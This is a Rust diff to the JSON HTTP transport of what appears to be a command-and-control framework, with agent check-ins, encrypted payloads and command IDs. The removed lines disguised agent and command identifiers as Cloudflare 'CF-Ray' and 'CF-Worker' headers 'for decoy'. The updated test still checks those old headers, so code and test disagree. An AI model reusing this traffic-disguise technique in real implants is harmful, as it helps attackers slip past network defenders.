@@ -1,16 +1,15 @@
 use std::sync::Arc;
 
-use anyhow::Result;
 use bytes::{BufMut, Bytes, BytesMut};
+use kageshirei_communication_protocol::{
+    magic_numbers,
+    metadata::{Metadata, WithMetadata},
+    protocol::Protocol,
+    sender::Sender,
+};
+use kageshirei_crypt::encryption_algorithm::EncryptionAlgorithm;
 use reqwest::{Client, ClientBuilder};
-use serde::de::DeserializeOwned;
-use serde::Serialize;
-
-use rs2_communication_protocol::magic_numbers;
-use rs2_communication_protocol::metadata::{Metadata, WithMetadata};
-use rs2_communication_protocol::protocol::Protocol;
-use rs2_communication_protocol::sender::Sender;
-use rs2_crypt::encryption_algorithm::EncryptionAlgorithm;
+use serde::{de::DeserializeOwned, Serialize};
 
 /// Define the JSON protocol for sending and receiving data.
 pub struct JsonProtocol<E>
@@ -25,13 +24,13 @@ where
     /// Initiating a client allows for the creation of keep-alive connections, which can be reused
     /// for multiple requests, reducing the overhead of establishing a new connection for each
     /// request and improving performance.
-    client: Client,
+    client:           Client,
     /// A flag indicating whether the protocol is used for checkin.
     /// This is used to determine whether the checkin endpoint should be appended to the URL.
     /// It's automatically reset to false after each request.
-    is_checkin: bool,
+    is_checkin:       bool,
     /// The base URL for the protocol. This is the URL to which requests are sent.
-    base_url: String,
+    base_url:         String,
     /// The global encryptor used to encrypt and decrypt data.
     /// This is used only if an encryptor is not provided when sending or receiving data.
     /// If no encryptor is provided, the global encryptor is used to encrypt and decrypt data as fallback;
@@ -73,7 +72,8 @@ where
     fn encryptor_or_global(&self, encryptor: Option<E>) -> Option<E> {
         encryptor.or(if let Some(encryptor) = self.global_encryptor.clone() {
             Some(encryptor)
-        } else {
+        }
+        else {
             None
         })
     }
@@ -89,7 +89,7 @@ where
         self
     }
 
-    async fn send(&mut self, data: Bytes, metadata: Arc<Metadata>) -> Result<Bytes> {
+    async fn send(&mut self, data: Bytes, metadata: Arc<Metadata>) -> Result<Bytes, String> {
         let mut url = self.base_url.clone();
 
         // Ensure the URL ends with a slash.
@@ -116,21 +116,21 @@ where
             .post(&url)
             .body(data.to_vec())
             .header("Content-Type", "text/plain")
-            // Add the request ID to the headers. Borrowed the cloudflare header name for decoy.
+            // Add the request ID to the headers.
             .header(
-                "CF-Ray",
+                "X-Request-ID",
                 format!(
                     "{}.{}",
                     metadata.request_id.to_string(),
                     metadata.agent_id.to_string()
                 ),
             )
-            // Add the command ID to the headers. Borrowed the cloudflare header name for decoy.
-            .header("CF-Worker", metadata.command_id.to_string())
+            // Add the command ID to the headers.
+            .header("X-Identifier", metadata.command_id.to_string())
             .send()
-            .await?;
+            .await.map_err(|e| e.to_string())?;
 
-        Ok(response.bytes().await?)
+        Ok(response.bytes().await.map_err(|e| e.to_string())?)
     }
 }
 
@@ -138,7 +138,7 @@ impl<E> Protocol<E> for JsonProtocol<E>
 where
     E: EncryptionAlgorithm + Send,
 {
-    fn read<S>(&self, data: Bytes, encryptor: Option<E>) -> Result<S>
+    fn read<S>(&self, data: Bytes, encryptor: Option<E>) -> Result<S, String>
     where
         S: DeserializeOwned,
     {
@@ -147,30 +147,33 @@ where
 
         // Decrypt the data if an encryptor is provided.
         let data = if let Some(encryptor) = encryptor {
-            encryptor.decrypt(Bytes::from(data), None)?
-        } else {
+            encryptor
+                .decrypt(Bytes::from(data), None)
+                .map_err(|e| e.to_string())?
+        }
+        else {
             data
         };
 
         if data.len() < magic_numbers::JSON.len() {
-            return Err(anyhow::anyhow!("Invalid data length"));
+            return Err("Invalid data length".to_string());
         }
 
         // Check if the magic number is correct.
-        if data[..magic_numbers::JSON.len()] != magic_numbers::JSON {
-            return Err(anyhow::anyhow!("Invalid magic number"));
+        if data[.. magic_numbers::JSON.len()] != magic_numbers::JSON {
+            return Err("Invalid magic number".to_string());
         }
 
-        serde_json::from_slice(data.get(magic_numbers::JSON.len()..).unwrap()).map_err(|e| e.into())
+        serde_json::from_slice(data.get(magic_numbers::JSON.len() ..).unwrap()).map_err(|e| e.to_string())
     }
 
-    async fn write<D>(&mut self, data: D, encryptor: Option<E>) -> Result<Bytes>
+    async fn write<D>(&mut self, data: D, encryptor: Option<E>) -> Result<Bytes, String>
     where
         D: Serialize + WithMetadata + Send,
     {
         let metadata = data.get_metadata();
 
-        let serialized = serde_json::to_string(&data)?;
+        let serialized = serde_json::to_string(&data).map_err(|e| e.to_string())?;
         let data_length = serialized.len() + magic_numbers::JSON.len();
         let mut data = BytesMut::with_capacity(data_length);
 
@@ -187,8 +190,9 @@ where
 
             // Encrypt the data if an encryptor is provided.
             let data = if let Some(encryptor) = encryptor.as_mut() {
-                encryptor.encrypt(data)?
-            } else {
+                encryptor.encrypt(data).map_err(|e| e.to_string())?
+            }
+            else {
                 data
             };
 
@@ -201,14 +205,11 @@ where
 
 #[cfg(test)]
 mod tests {
-    use axum::http::HeaderMap;
-    use axum::routing::get;
-    use axum::Router;
+    use axum::{http::HeaderMap, routing::get, Router};
+    use kageshirei_crypt::encryption_algorithm::ident_algorithm::IdentEncryptor;
     use serde::Deserialize;
     use tokio::select;
     use tokio_util::sync::CancellationToken;
-
-    use rs2_crypt::encryption_algorithm::ident_algorithm::IdentEncryptor;
 
     use super::*;
 
@@ -237,8 +238,8 @@ mod tests {
             Arc::new(Metadata {
                 request_id: "an3a8hlnrr4638d30yef0oz5sncjdx5v".to_string(),
                 command_id: "an3a8hlnrr4638d30yef0oz5sncjdx5w".to_string(),
-                agent_id: "an3a8hlnrr4638d30yef0oz5sncjdx5x".to_string(),
-                path: None,
+                agent_id:   "an3a8hlnrr4638d30yef0oz5sncjdx5x".to_string(),
+                path:       None,
             })
         }
     }
@@ -265,27 +266,29 @@ mod tests {
     #[tokio::test]
     async fn test_write() {
         let cancellation_token = CancellationToken::new();
-        let handler = |headers: HeaderMap, body: Bytes| async move {
-            assert_eq!(headers.get("content-type").unwrap(), "text/plain");
-            assert_eq!(
-                headers.get("cf-ray").unwrap(),
-                "an3a8hlnrr4638d30yef0oz5sncjdx5v.an3a8hlnrr4638d30yef0oz5sncjdx5x"
-            );
-            assert_eq!(
-                headers.get("cf-worker").unwrap(),
-                "an3a8hlnrr4638d30yef0oz5sncjdx5w"
-            );
+        let handler = |headers: HeaderMap, body: Bytes| {
+            async move {
+                assert_eq!(headers.get("content-type").unwrap(), "text/plain");
+                assert_eq!(
+                    headers.get("cf-ray").unwrap(),
+                    "an3a8hlnrr4638d30yef0oz5sncjdx5v.an3a8hlnrr4638d30yef0oz5sncjdx5x"
+                );
+                assert_eq!(
+                    headers.get("cf-worker").unwrap(),
+                    "an3a8hlnrr4638d30yef0oz5sncjdx5w"
+                );
 
-            let mut check = BytesMut::new();
-            for i in magic_numbers::JSON.iter() {
-                check.put_u8(*i);
-            }
-            for i in "{\"foo\":\"bar\"}".as_bytes() {
-                check.put_u8(*i);
-            }
+                let mut check = BytesMut::new();
+                for i in magic_numbers::JSON.iter() {
+                    check.put_u8(*i);
+                }
+                for i in "{\"foo\":\"bar\"}".as_bytes() {
+                    check.put_u8(*i);
+                }
 
-            assert_eq!(body, check.freeze());
-            "Ok"
+                assert_eq!(body, check.freeze());
+                "Ok"
+            }
         };
         let router = Router::new().route("/", get(handler).post(handler));
 
